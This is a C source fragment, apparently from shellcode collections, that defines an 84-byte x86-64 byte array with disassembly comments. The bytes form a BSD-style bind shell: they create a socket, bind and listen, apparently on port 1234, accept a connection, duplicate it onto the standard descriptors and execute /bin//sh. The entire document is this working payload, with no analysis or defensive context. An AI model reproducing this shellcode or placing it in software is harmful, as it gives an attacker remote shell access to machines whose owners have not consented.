
#define BS_SIZE 84

char BS[] = {
  /* 0000 */ "\x48\xb8\xff\xfd\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfdff */
  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 000D */ "\x50"                                     /* push rax                    */
  /* 000E */ "\x54"                                     /* push rsp                    */
  /* 000F */ "\x5d"                                     /* pop rbp                     */
  /* 0010 */ "\x6a\x61"                                 /* push 0x61                   */
  /* 0012 */ "\x58"                                     /* pop rax                     */
  /* 0013 */ "\x99"                                     /* cdq                         */
  /* 0014 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0016 */ "\x5e"                                     /* pop rsi                     */
  /* 0017 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0019 */ "\x5f"                                     /* pop rdi                     */
  /* 001A */ "\x0f\x05"                                 /* syscall                     */
  /* 001C */ "\x97"                                     /* xchg edi, eax               */
  /* 001D */ "\x55"                                     /* push rbp                    */
  /* 001E */ "\x5e"                                     /* pop rsi                     */
  /* 001F */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0021 */ "\xb0\x68"                                 /* mov al, 0x68                */
  /* 0023 */ "\x0f\x05"                                 /* syscall                     */
  /* 0025 */ "\x50"                                     /* push rax                    */
  /* 0026 */ "\x5e"                                     /* pop rsi                     */
  /* 0027 */ "\xb0\x6a"                                 /* mov al, 0x6a                */
  /* 0029 */ "\x0f\x05"                                 /* syscall                     */
  /* 002B */ "\xb0\x1e"                                 /* mov al, 0x1e                */
  /* 002D */ "\x99"                                     /* cdq                         */
  /* 002E */ "\x0f\x05"                                 /* syscall                     */
  /* 0030 */ "\x97"                                     /* xchg edi, eax               */
  /* 0031 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0033 */ "\x5e"                                     /* pop rsi                     */
  /* 0034 */ "\x6a\x5a"                                 /* push 0x5a                   */
  /* 0036 */ "\x58"                                     /* pop rax                     */
  /* 0037 */ "\x0f\x05"                                 /* syscall                     */
  /* 0039 */ "\xff\xce"                                 /* dec esi                     */
  /* 003B */ "\x79\xf7"                                 /* jns 0x34                    */
  /* 003D */ "\x99"                                     /* cdq                         */
  /* 003E */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rbx, 0x68732f2f6e69622f */
  /* 0048 */ "\x52"                                     /* push rdx                    */
  /* 0049 */ "\x53"                                     /* push rbx                    */
  /* 004A */ "\x54"                                     /* push rsp                    */
  /* 004B */ "\x5f"                                     /* pop rdi                     */
  /* 004C */ "\x52"                                     /* push rdx                    */
  /* 004D */ "\x57"                                     /* push rdi                    */
  /* 004E */ "\x54"                                     /* push rsp                    */
  /* 004F */ "\x5e"                                     /* pop rsi                     */
  /* 0050 */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 0052 */ "\x0f\x05"                                 /* syscall                     */
};